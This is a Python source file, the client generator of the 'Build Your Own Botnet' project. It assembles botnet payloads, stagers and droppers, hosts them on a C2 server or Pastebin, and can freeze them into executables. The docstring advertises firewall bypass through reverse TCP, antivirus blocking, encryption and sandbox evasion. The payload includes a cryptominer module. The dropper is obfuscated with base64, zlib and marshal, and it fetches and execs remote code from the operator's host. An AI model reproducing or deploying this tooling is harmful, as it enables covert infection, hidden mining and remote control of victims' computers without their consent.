#!/usr/bin/python
# -*- coding: utf-8 -*-
"""Client Generator (Build Your Own Botnet)

usage: client.py [-h] [-v] [--name NAME] [--icon ICON] [--pastebin API]
                 [--encrypt] [--obfuscate] [--compress] [--freeze]
                 host port [module [module ...]]

Generator (Build Your Own Botnet)

positional arguments:
  host            server IP address
  port            server port number
  module          module(s) to remotely import at run-time

optional arguments:
  -h, --help      show this help message and exit
  -v, --version   show program's version number and exit
  --name NAME     output file name
  --icon ICON     icon image file name
  --pastebin API  upload & host payload on pastebin
  --encrypt       encrypt payload and embed key in stager
  --compress      zip-compress into a self-executing python script
  --freeze        compile client into a standalone executable for the current host platform

Generate clients with the following features:

    - Zero Dependencies
        stager runs with just the python standard library

    - Remote Imports
        remotely import third-party packages from
        the server without downloading/installing them

    - In-Memory Execution Guidline
        clients never write anything to the disk,
        not even temporary files - zero IO system calls.
        remote imports allow code/scripts/modules to
        be dynamically loaded into memory and directly
        imported into the currently running process

    - Add Your Own Scripts
        every python script, module, and package in the
        `remote` directory is directl usable by every
        client at all times while the server is running

    - Unlimited Modules Without Bloating File Size
        use remote imports to add unlimited features without
        adding a single byte to the client's file size

    - Updatable
        client periodically checks the content available
        for remote import from the server, and will
        dynamically update its in-memory resources
        if anything has been added/removed

    - Platform Independent
        compatible with PyInstaller and package is authored
        in Python, a platform agnostic language

    - Bypass Firewall
        connects to server via outgoing connections
        (i.e. reverse TCP payloads) which most firewall
        filters allow by default k

    - Evade Antivirus
        blocks any spawning process
        with names of known antivirus products

    - Prevent Analysis
        main client payload encrypted with a random
        256-bit key and is only

    - Avoid Detection
        client will abort execution if a virtual machine
        or sandbox is detected
"""

# standard library
import os
import sys
import zlib
import base64
import random
import marshal
import argparse
import itertools
import threading
if sys.version_info[0] < 3:
    from urllib2 import urlparse
    from urllib import pathname2url
else:
    from urllib import parse as urlparse
    from urllib.request import pathname2url
    sys.path.append('core')

# packages
import colorama

# modules
import core.util as util
import core.security as security
import core.generators as generators

# globals
colorama.init(autoreset=True)
__banner = """

88                                  88
88                                  88
88                                  88
88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
88       d8  `8b   d8'  8b       d8 88       d8
88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
                d8'
               d8'
"""

# main
def main():
    """
    Run the generator

    """
    util.display(globals()['__banner'], color=random.choice(list(filter(lambda x: bool(str.isupper(x) and 'BLACK' not in x), dir(colorama.Fore)))), style='normal')

    parser = argparse.ArgumentParser(
        prog='client.py',
        description="Generator (Build Your Own Botnet)"
    )

    parser.add_argument('host',
                        action='store',
                        type=str,
                        help='server IP address')

    parser.add_argument('port',
                        action='store',
                        type=str,
                        help='server port number')

    parser.add_argument('modules',
                        metavar='module',
                        nargs='*',
                        help='module(s) to remotely import at run-time')

    parser.add_argument('--name',
                        action='store',
                        help='output file name')

    parser.add_argument('--icon',
                        action='store',
                        help='icon image file name')

    parser.add_argument('--pastebin',
                        action='store',
                        metavar='API',
                        help='upload the payload to Pastebin (instead of the C2 server hosting it)')

    parser.add_argument('--encrypt',
                        action='store_true',
                        help='encrypt the payload with a random 128-bit key embedded in the payload\'s stager',
                        default=False)

    parser.add_argument('--compress',
                        action='store_true',
                        help='zip-compress into a self-extracting python script',
                        default=False)

    parser.add_argument('--freeze',
                        action='store_true',
                        help='compile client into a standalone executable for the current host platform',
                        default=False)

    parser.add_argument('--debug',
                        action='store_true',
                        help='enable debugging output for frozen executables',
                        default=False
    )

    parser.add_argument(
        '-v', '--version',
        action='version',
        version='0.5',
    )

    options = parser.parse_args()
    key = base64.b64encode(os.urandom(16))
    var = generators.variable(3)


    # Find all the files which need to included in the payload (in form `module/core.py`)
    modules = _modules(options, var=var, key=key)

    # Find all the import statements in those modules (ignore core)
    imports = _imports(options, var=var, key=key, modules=modules)

    # Strip out the names of imported packages
    hidden  = _hidden (options, var=var, key=key, modules=modules, imports=imports)

    # 1) Put everything together into one large file
    # 2) Either
    #       - Writes the result to pastebin
    #       - Writes the result to a file
    # 3) Returns the URL where its hosted
    payload = _payload(options, var=var, key=key, modules=modules, imports=imports, hidden=hidden)

    stager  = _stager (options, var=var, key=key, modules=modules, imports=imports, hidden=hidden, url=payload)

    dropper = _dropper(options, var=var, key=key, modules=modules, imports=imports, hidden=hidden, url=stager)

    return dropper





def _update(input, output, task=None):
    diff = round(float(100.0 * float(float(len(output))/float(len(input)) - 1.0)))
    util.display("({:,} bytes {} to {:,} bytes ({}% {})".format(len(input), 'increased' if len(output) > len(input) else 'reduced', len(output), diff, 'larger' if len(output) > len(input) else 'smaller').ljust(80), style='dim', color='reset')


def _modules_(options, **kwargs):
    util.display("\n[>]", color='green', style='bright', end=' ')
    util.display('Modules', color='reset', style='bright')
    util.display("\tAdding modules... ", color='reset', style='normal', end=' ')

    global __load__
    __load__ = threading.Event()
    __spin__ = _spinner(__load__)

    modules = ['core/util.py','core/security.py','core/payloads.py', 'core/miner.py']

    if len(options.modules):
        for m in options.modules:
            if isinstance(m, str):
                base = os.path.splitext(os.path.basename(m))[0]
                if not os.path.exists(m):
                    _m = os.path.join(os.path.abspath('modules'), os.path.basename(m))
                    if _m not in [os.path.splitext(_)[0] for _ in os.listdir('modules')]:
                        util.display("[-]", color='red', style='normal')
                        util.display("can't add module: '{}' (does not exist)".format(m), color='reset', style='normal')
                        continue
                module = os.path.join(os.path.abspath('modules'), m if '.py' in os.path.splitext(m)[1] else '.'.join([os.path.splitext(m)[0], '.py']))
                modules.append(module)
    __load__.set()
    util.display("({} modules added to client)".format(len(modules)), color='reset', style='dim')
    return modules



def _modules(options, **kwargs):
    util.display("\n[>]", color='green', style='bright', end=' ')
    util.display('Modules', color='reset', style='bright')
    util.display("\tAdding modules... ", color='reset', style='normal', end=' ')

    global __load__
    __load__ = threading.Event()
    __spin__ = _spinner(__load__)

    modules = ['core/util.py', 'core/security.py', 'core/payloads.py', 'core/miner.py']


    def exit():
        __load__.set()
        util.display("({} modules added to client)".format(len(modules)), color='reset', style='dim')
        return modules

    def build_module_name(arg1):
        return 'modules/' + arg1 + '.py'
        # return os.path.join(os.path.abspath('modules'), arg1 if '.py' in os.path.splitext(arg1)[1] else ''.join([os.path.splitext(arg1)[0], '.py']))


    if not len(options.modules):
        return exit()

    for m in options.modules:

        if not isinstance(m, str):
            util.display("[-] can't add module: '{}' (not a string)".format(m), color='red', style='normal')
            continue

        if os.path.exists(m): # Full import path listed. Add it to modules?
            modules.append(build_module_name(m))
            continue

        if m not in [os.path.splitext(_)[0] for _ in os.listdir('modules')]:
            util.display("[-] can't add module: '{}' (does not exist)".format(m), color='red', style='normal')
            continue

        modules.append(build_module_name(m))

    return exit()



def _imports(options, **kwargs):
    util.display("\n[>]", color='green', style='bright', end=' ')
    util.display("Imports", color='reset', style='bright')

    assert 'modules' in kwargs, "missing keyword argument 'modules'"

    util.display("\tAdding imports...", color='reset', style='normal', end=' ')

    global __load__
    globals()['__load__'] = threading.Event()
    globals()['__spin__'] = _spinner(__load__)

    imports  = set()

    for module in kwargs['modules']:
        for line in open(module, 'r').read().splitlines():
            if not len(line.split()):
                continue

            if not line.split()[0] == 'import':
                continue

            # Ignore all the imports from core?
            for x in ['core'] + [os.path.splitext(i)[0] for i in os.listdir('core')] + ['core.%s' % s for s in [os.path.splitext(i)[0] for i in os.listdir('core')]]:
                if x in line: break
            else:
                imports.add(line.strip())

    imports = list(imports)
    if sys.platform == 'win32':
        return imports

    for item in imports:
        if 'win32' in item or '_winreg' in item:
            imports.remove(item)

    return imports



def _imports_(options, **kwargs):
    util.display("\n[>]", color='green', style='bright', end=' ')
    util.display("Imports", color='reset', style='bright')

    assert 'modules' in kwargs, "missing keyword argument 'modules'"

    util.display("\tAdding imports...", color='reset', style='normal', end=' ')

    global __load__
    globals()['__load__'] = threading.Event()
    globals()['__spin__'] = _spinner(__load__)

    imports  = set()

    for module in kwargs['modules']:
        for line in open(module, 'r').read().splitlines():
            if len(line.split()):
                if line.split()[0] == 'import':
                    for x in ['core'] + [os.path.splitext(i)[0] for i in os.listdir('core')] + ['core.%s' % s for s in [os.path.splitext(i)[0] for i in os.listdir('core')]]:
                        if x in line:
                            break
                    else:
                        imports.add(line.strip())

    imports = list(imports)
    if sys.platform != 'win32':
        for item in imports:
            if 'win32' in item or '_winreg' in item:
                imports.remove(item)
    return imports



def _hidden(options, **kwargs):

    assert 'imports' in kwargs, "missing keyword argument 'imports'"
    assert 'modules' in kwargs, "missing keyword argument 'modules'"

    hidden = set()

    for line in kwargs['imports']:
        if len(line.split()) > 1:
            for i in str().join(line.split()[1:]).split(';')[0].split(','):
                i = line.split()[1] if i == '*' else i
                hidden.add(i)
        elif len(line.split()) > 3: # bug. this line never gets hit. Doesn't break so leaving in
            for i in str().join(line.split()[3:]).split(';')[0].split(','):
                i = line.split()[1] if i == '*' else i
                hidden.add(i)

    globals()['__load__'].set()
    util.display("({} imports from {} modules)".format(len(list(hidden)), len(kwargs['modules'])), color='reset', style='dim')
    return list(hidden)



def _payload(options, **kwargs):
    util.display("\n[>]", color='green', style='bright', end=' ')
    util.display("Payload", color='reset', style='bright')

    assert 'var' in kwargs, "missing keyword argument 'var'"
    assert 'modules' in kwargs, "missing keyword argument 'modules'"
    assert 'imports' in kwargs, "missing keyword argument 'imports'"

    # loader  = '\n'.join((open('core/loader.py','r').read(), generators.loader(host=options.host, port=int(options.port)+2, packages=list(kwargs['hidden']))))
    loader  = open('core/loader.py','r').read()
    # test_imports = '\n'.join(['import ' + i for i in list(kwargs['hidden']) if i not in ['StringIO','_winreg','pycryptonight','pyrx']])
    test_imports = '\n'.join(['import ' + i for i in list(kwargs['hidden']) if i not in ['StringIO','_winreg','pycryptonight']])
    potential_imports = '''
try:
    import pycryptonight
    # import pyrx
    import hashlib
except ImportError: pass
'''
    modules = ''
    # They put # main after the imports so they can chop them out from file and
    #   append all of them above
    modules += '\n'.join(
        [ open(module,'r').read().partition('# main')[2] 
         for 
            module 
         in 
            kwargs['modules']]) + '\n' # blank line on end so next insert start on new line

    # This creates the actual main statement for the new file
    modules += generators.main('Payload', **{"host": options.host, "port": options.port, "pastebin": options.pastebin if options.pastebin else str()}) + '_payload.run()'

    """
    modules = '\n'.join((
        [ open(module,'r').read().partition('# main')[2] 
         for 
            module 
         in 
            kwargs['modules']] 
            + 
            [ generators.main('Payload', **{"host": options.host, "port": options.port, "pastebin": options.pastebin if options.pastebin else str()}) + '_payload.run()']))
    """

    # Join them all into one payload file
    payload = '\n'.join((loader, test_imports, potential_imports, modules))

    if not os.path.isdir('modules/clients'):
        try:
            os.mkdir('modules/clients')
        except OSError:
            util.log("Permission denied: unabled to make directory './modules/clients/'")

    if not os.path.isdir('modules/clients/payloads'):
        try:
            os.mkdir('modules/clients/payloads')
        except OSError:
            util.log("Permission denied: unabled to make directory './modules/clients/payloads/'")

    if options.compress:
        # Converts code to Base64 encoded zip. The wraps the result in python code which would
        #   uncompress the text and run it as code. Very clever 
        # Returns the result as a string so that its still just python code
        util.display("\tCompressing payload... ", color='reset', style='normal', end=' ')
        __load__ = threading.Event()
        __spin__ = _spinner(__load__)
        output = generators.compress(payload)
        __load__.set()
        _update(payload, output, task='Compression')
        payload = output

    if options.encrypt:
        assert 'key' in kwargs, "missing keyword argument 'key' required for option 'encrypt'"
        util.display("\tEncrypting payload... ".format(kwargs['key']), color='reset', style='normal', end=' ')
        __load__ = threading.Event()
        __spin__ = _spinner(__load__)
        output = security.encrypt_xor(payload, base64.b64decode(kwargs['key']))
        __load__.set()
        _update(payload, output, task='Encryption')
        payload = output

    util.display("\tUploading payload... ", color='reset', style='normal', end=' ')

    __load__ = threading.Event()
    __spin__ = _spinner(__load__)

    if options.pastebin:
        # Seems to upload it to pastebin
        assert options.pastebin, "missing argument 'pastebin' required for option 'pastebin'"
        url = util.pastebin(payload, options.pastebin)
    else:
        dirs = ['modules/clients/payloads','byob/modules/clients/payloads','byob/byob/modules/clients/payloads']
        dirname = '.'
        for d in dirs:
            if os.path.isdir(d):
                dirname = d

        # Generate the file name
        path = os.path.join(os.path.abspath(dirname), kwargs['var'] + '.py' )

        # Write the python file
        with open(path, 'w') as fp:
            fp.write(payload)
         
        # Host the python file for download
        s = 'http://{}:{}{}'.format(options.host, int(options.port) + 1, pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
        s = urlparse.urlsplit(s)
        url = urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')

    __load__.set()
    util.display("(hosting payload at: {})".format(url), color='reset', style='dim')
    return url



def _stager(options, **kwargs):
    util.display("\n[>]", color='green', style='bright', end=' ')
    util.display("Stager", color='reset', style='bright')

    assert 'url' in kwargs, "missing keyword argument 'url'"
    assert 'key' in kwargs, "missing keyword argument 'key'"
    assert 'var' in kwargs, "missing keyword argument 'var'"

    # Write the stager with a main statement as a string
    if options.encrypt:
        stager = open('core/stagers.py', 'r').read() + generators.main('run', url=kwargs['url'], key=kwargs['key'])
    else:
        stager = open('core/stagers.py', 'r').read() + generators.main('run', url=kwargs['url'])

    # Make some utility directories
    if not os.path.isdir('modules/clients'):
        try:
            os.mkdir('modules/clients')
        except OSError:
            util.log("Permission denied: unabled to make directory './modules/clients/'")
    if not os.path.isdir('modules/clients/stagers'):
        try:
            os.mkdir('modules/clients/stagers')
        except OSError:
            util.log("Permission denied: unable to make directory './modules/clients/stagers/'")

    # Compress the stager
    if options.compress:
        util.display("\tCompressing stager... ", color='reset', style='normal', end=' ')
        __load__ = threading.Event()
        __spin__ = _spinner(__load__)
        output = generators.compress(stager)
        __load__.set()
        _update(stager, output, task='Compression')
        stager = output


    util.display("\tUploading stager... ", color='reset', style='normal', end=' ')
    __load__ = threading.Event()
    __spin__ = _spinner(__load__)

    if options.pastebin:
        assert options.pastebin, "missing argument 'pastebin' required for option 'pastebin'"
        url = util.pastebin(stager, options.pastebin)
    else:
        dirs = ['modules/clients/stagers','byob/modules/clients/stagers','byob/byob/modules/clients/stagers']
        dirname = '.'
        for d in dirs:
            if os.path.isdir(d):
                dirname = d

        path = os.path.join(os.path.abspath(dirname), kwargs['var'] + '.py' )

        with open(path, 'w') as fp:
            fp.write(stager)

        s = 'http://{}:{}{}'.format(options.host, int(options.port) + 1, pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
        s = urlparse.urlsplit(s)
        url = urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')

    __load__.set()
    util.display("(hosting stager at: {})".format(url), color='reset', style='dim')
    return url



def _dropper(options, **kwargs):
    util.display("\n[>]", color='green', style='bright', end=' ')
    util.display("Dropper", color='reset', style='bright')
    util.display('\tWriting dropper... ', color='reset', style='normal', end=' ')

    assert 'url' in kwargs, "missing keyword argument 'url'"
    assert 'var' in kwargs, "missing keyword argument 'var'"
    assert 'hidden' in kwargs, "missing keyword argument 'hidden'"

    # Making utility directories
    if not os.path.isdir('modules/clients'):
        try:
            os.mkdir('modules/clients')
        except OSError:
            util.log("Permission denied: unabled to make directory './modules/clients/'")
    if not os.path.isdir('modules/clients/droppers'):
        try:
            os.mkdir('modules/clients/droppers')
        except OSError:
            util.log("Permission denied: unabled to make directory './modules/clients/droppers/'")
    
    dirs = ['modules/clients/droppers','byob/modules/clients/droppers','byob/byob/modules/clients/droppers']
    dirname = '.'
    for d in dirs:
        if os.path.isdir(d):
            dirname = d

    name = 'byob_{}.py'.format(kwargs['var']) if not options.name else options.name
    if not name.endswith('.py'):
        name += '.py'

    path = os.path.join(os.path.abspath(dirname), name)

    dropper = """import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))""".format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()".format(repr(kwargs['url'])),2)))))

    with open(path, 'w') as fp:
        fp.write(dropper)
    util.display('({:,} bytes written to {})'.format(len(dropper), path.replace(os.getcwd(), '')), style='dim', color='reset')

    # How the frozen binary is built
    if options.freeze:
        util.display('\tCompiling executable...\n', color='reset', style='normal', end=' ')
        name = generators.freeze('modules/clients/payloads/' + kwargs['var'] + '.py', icon=options.icon, hidden=kwargs['hidden'], debug=options.debug)
        util.display('({:,} bytes saved to file: {})\n'.format(len(open(name, 'rb').read()), name))
    return name



@util.threaded
def _spinner(flag):
    spinner = itertools.cycle(['-', '/', '|', '\\'])
    while not flag.is_set():
        try:
            sys.stdout.write(next(spinner))
            sys.stdout.flush()
            flag.wait(0.2)
            sys.stdout.write('\b')
            sys.stdout.flush()
        except:
            break



if __name__ == '__main__':
    main()
